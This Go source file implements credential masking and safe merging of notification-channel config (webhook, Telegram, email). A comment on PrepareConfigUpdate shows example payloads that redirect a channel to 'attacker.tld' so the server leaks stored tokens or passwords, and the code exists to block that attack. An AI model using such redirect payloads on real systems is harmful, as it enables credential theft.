package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix for a masked value. When the API echoes
// credentials it replaces the real content with a value carrying this prefix, and when
// the update endpoint receives a value with this prefix it interprets it as "keep the
// stored value unchanged".
//
// A prefix is used instead of an empty string or a fixed constant so it can also carry
// a bit of identifying information (see MaskedValue), letting the user tell "which bot
// this is" without having to re-paste the key.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              original value too short, give no hint
//	"__masked__:…ab12cd"      carries the last 6 chars of the original as an ID hint
//
// Exposing only the last 6 chars is a deliberate choice: the identifying information of
// a Webhook address is in the tail (such as the WeCom key or the Feishu bot id), while
// the prefix part is the same across bots and has no identifying value. The last 6
// chars are not enough to reconstruct the credential, but are enough to let the
// configurer recognize "it's that group of mine".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. echoed by the API and not
// modified).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with the channel's credential fields
// replaced by masked values.
//
// An unknown channel type returns an empty map rather than the original config -- it
// is better to let the UI show "config unavailable" than to spit back the possibly
// credential-bearing original content whole when the channel type cannot be
// recognized.
// Non-credential fields are preserved as-is so the UI can display normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// A nested structure like headers is treated as a single credential as a
		// whole: judging each subkey would require each channel to declare another set
		// of rules for "which subkeys are credentials", a complexity far beyond the
		// benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination changed, but the
// caller did not attest the credential fields". It is returned rather than silently
// allowing it or silently discarding the credential, for the reasons in
// PrepareConfigUpdate.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // the destination keys that changed
	Missing []string // the credential keys not explicitly attested
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "the destination (" + strings.Join(e.Changed, ", ") + ") has changed; please also re-enter the credential fields (" +
		strings.Join(e.Missing, ", ") + "): provide new values, or explicitly leave them empty to indicate credentials are no longer needed. " +
		"The original credentials are only valid for the old destination; continuing to use them means handing them to the new destination."
}

// PrepareConfigUpdate merges channel config and handles the security-sensitive case of
// a "destination change".
//
// It replaces a bare MergeConfig on the channel-update path, solving this empirically
// workable path: the destination (where the message is sent) and the credential (what
// identity it is sent with) are two independent sets of fields, and MergeConfig
// preserves the stored value for any "unmentioned key". So anyone who can PATCH a
// channel only has to **change the address alone and stay silent about credentials** to
// make the server send the real stored credentials to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  -> original Authorization header sent out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} -> /bot<real token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    -> username and password handed over after STARTTLS
//
// This path is completely silent and does not depend on redirects (so rejecting
// cross-host hops does not stop it), and it directly defeats the goal of this
// package's mask mechanism -- "credentials are not echoed to the browser".
//
// Rule: as soon as a destination key is changed to a new value, the caller must
// explicitly attest **every** credential key:
//   - give a new value -> use the new value
//   - explicitly pass an empty string -> the field no longer needs a credential
//     (preserving the clear semantics)
//   - echo back the masked value / simply not mention the key -> reject
//
// The third is also rejected because the meaning of a "masked value" is exactly "keep
// using the old credential", and the old credential is only valid for the old address.
// "Auto-discarding the credential" is deliberately not done here -- for optional
// credential fields (webhook's headers, email's password) that would silently become
// "auth is gone but the endpoint returns 200", harder to troubleshoot than an error.
// Better to make the operator fill it in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (such as webhook's headers being an object) has
	// a masked literal embedded inside it, it means the caller stuffed the "keep the
	// original" sentinel inside the structure. MergeConfig only recognizes "a string
	// with the prefix" as masked, and this form would be stored as-is as an ordinary
	// object -- the literal "__masked__" is actually persisted, and subsequent auth
	// silently fails with no error at all. Better to reject it.
	//
	// This check must go **first**: when the address has not changed there is an early
	// return, and putting it later would cover only the "address changed" path (the
	// first version placed it wrong, and the test caught it directly).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that were actually changed. A masked value equals "not
	// changed".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// The address did not change; do a normal merge (masked values keep the
		// original, empty strings clear, everything else overrides).
		return MergeConfig(stored, incoming), nil
	}

	// The address changed: require explicit attestation of every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submitting a masked sentinel embedded in a
// non-string structure.
//
// The mask mechanism assumes "the whole value is a string". An object field like
// webhook's headers can only be masked as a whole (written as the string
// "__masked__") or submitted as a whole; stuffing the sentinel inside the object
// neither expresses "keep unchanged" nor avoids being stored as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains the mask marker %q: this field can only be left entirely empty to keep the stored value, or submitted entirely as a new value; a mask placeholder cannot be smuggled inside the structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares whether two config values are equivalent. Comparing via
// JSON serialization also handles type differences -- the frontend submits the port as
// a number, while the DB reads it back as float64, and a direct == would misjudge.
//
// "Blank" must be normalized before comparing: an empty string and "key does not
// exist" are the same state in this config model, because MergeConfig treats an empty
// string as an explicit clear and deletes the key outright. Without normalization, an
// always-empty optional destination field (Telegram's base_url is the only such field:
// empty means use the official address) would go down this path --
//
//	stored as base_url:"" on creation  ->  deleted by MergeConfig on first save
//	-> on second save, incoming is "", stored lacks the key, judged "address changed"
//	-> credential is a masked value -> 400 "the destination has changed, please also re-enter the credential fields"
//
// After that every save fails unless the user re-pastes the Bot Token, having changed
// nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue decides whether a config value is "blank".
// The standard must match MergeConfig's clear decision (strings.TrimSpace(s) == ""),
// otherwise there would be a gap where "MergeConfig thinks it should be deleted while
// sameConfigValue thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, for updating channel config.
//
// Rules:
//   - a key in incoming whose value is masked -> keep stored's original value (the
//     user did not change this field)
//   - a key in incoming whose value is an empty string -> treated as an explicit
//     clear, delete the key
//   - all other keys -> overridden by incoming's value
//   - a key in stored but not in incoming -> kept (partial-update semantics)
//
// Whether an empty string counts as "clear" must be explicit: the frontend form
// submits unfilled fields as empty strings, and treating them as valid values and
// writing them would truly clear the fields meant to be "left empty to keep the
// original".
// This chooses explicit clear, because to clear a wrongly-set field the user has no
// other way to express it (dragging a field away could distinguish "not provided" from
// "provided empty", but the UI does not use that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unchanged, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
